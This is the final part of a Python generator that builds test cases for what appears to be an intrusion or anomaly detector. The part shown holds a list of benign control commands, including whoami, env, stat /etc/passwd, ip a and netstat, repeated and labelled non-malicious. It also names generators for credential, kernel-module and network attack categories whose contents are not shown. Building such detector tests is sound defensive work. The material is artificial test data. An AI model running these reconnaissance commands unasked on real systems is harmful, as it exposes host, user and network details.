        ("whoami", "whoami >/dev/null"),
        ("pwd", "pwd >/dev/null"),
        ("which_ls", "which ls >/dev/null"),
        ("env", "env >/dev/null"),
        ("history", "history >/dev/null 2>&1 || true"),
        ("hostname", "hostname >/dev/null"),
        ("readlink_self", "readlink /proc/self/exe >/dev/null"),
        ("stat_etc_pwd", "stat /etc/passwd >/dev/null"),
        ("ls_etc", "ls /etc >/dev/null"),
        ("head_meminfo", "head /proc/meminfo >/dev/null"),
        ("top_n1", "top -bn1 -n 1 >/dev/null 2>&1 || true"),
        ("ps_ef", "ps -ef | head -3 >/dev/null"),
        ("lsb_release", "lsb_release -a >/dev/null 2>&1 || true"),
        ("ip_a", "ip a >/dev/null 2>&1 || true"),
        ("ss_t", "ss -t >/dev/null 2>&1 || true"),
        ("netstat", "netstat -an 2>/dev/null | head -5 >/dev/null || true"),
        ("apt_list", "apt list --installed 2>/dev/null | head -3 >/dev/null || true"),
    ]
    for name, cmd in benign_cmds:
        for variant in range(4):  # 4 reps per benign cmd
            i += 1
            tests.append({
                "id": f"BENIGN-{i:04d}", "category": "BENIGN",
                "subcategory": name, "malicious": False,
                "desc": f"benign: {name} v{variant}",
                "cmd": cmd,
                "expect_rule": r"(?!.*)", "detector": "control", "window": 3,
            })
    return tests


# =========================================================
# All-in-one
# =========================================================
def gen_all():
    return {
        "NS":     gen_ns(),
        "AF":     gen_af(),
        "KMOD":   gen_kmod(),
        "CRED2":  gen_cred2(),
        "MEM2":   gen_mem2(),
        "NET":    gen_net(),
        "REPLAY": gen_replay(),
        "RT":     gen_rt(),
        "FUZZ":   gen_fuzz(),
        "BENIGN": gen_benign(),
    }


if __name__ == "__main__":
    g = gen_all()
    total = 0
    print(f"{'Category':<10} {'tests':>6}  {'malicious':>10}  {'benign':>8}")
    for cat, tests in g.items():
        m = sum(1 for x in tests if x["malicious"])
        b = sum(1 for x in tests if not x["malicious"])
        print(f"{cat:<10} {len(tests):>6}  {m:>10}  {b:>8}")
        total += len(tests)
    print(f"{'='*40}\n{'TOTAL':<10} {total:>6}")
